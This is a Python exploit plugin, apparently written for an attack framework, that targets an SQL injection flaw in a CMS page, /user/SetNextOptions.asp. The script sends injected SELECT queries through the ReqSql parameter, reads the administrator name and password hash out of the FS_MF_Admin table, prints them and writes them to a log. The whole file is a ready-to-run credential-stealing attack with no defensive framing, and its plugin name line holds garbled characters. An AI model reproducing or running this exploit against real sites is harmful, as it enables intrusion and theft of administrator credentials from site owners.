# -*- coding: utf-8 -*-
class mstplugin:
    infos = [
        ['Plugin','∑Á—∂ SetNextOptions.asp SQLInject'],
        ['Author','Mr.x'],
        ['Update','2013/11/7'],
        ['QQ','414106785']
        ]
    opts  = [
        ['URL','localhost','Url'],
        ['PATH','/','Cms path'],
        ['PORT','80','port']
        ]
    def exploit(self):
        url = fuck.urlformate(URL,PORT,PATH)
        exp_name = url+"/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_name,3,4,5,6,7,8+from+FS_MF_Admin"
        exp_pass = url+"/user/SetNextOptions.asp?sType=1&EquValue=aaaa&SelectName=aaa&ReqSql=select+1,admin_pass_word,3,4,5,6,7,8+from+FS_MF_Admin"
        color.cprint("[*] Inject user..",YELLOW)
        ok  = fuck.urlget(exp_name)
        if ok.getcode() == 200:
            tmp=fuck.find("(\w+)<",ok.read())
            #print tmp[0]
            if len(tmp)>0:
                user = tmp[0]
                ok  = fuck.urlget(exp_pass)
                tmp=fuck.find("(\w+)<",ok.read())
                pass_md5 = tmp[0]
                color.cprint("[*] Exploit Successful !",GREEN)
                color.cprint('[*] '+user+'|'+pass_md5,GREEN)
                fuck.writelog("FS_SetNextOptions.asp_Inject",URL+"::"+user+"::"+pass_md5)
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)
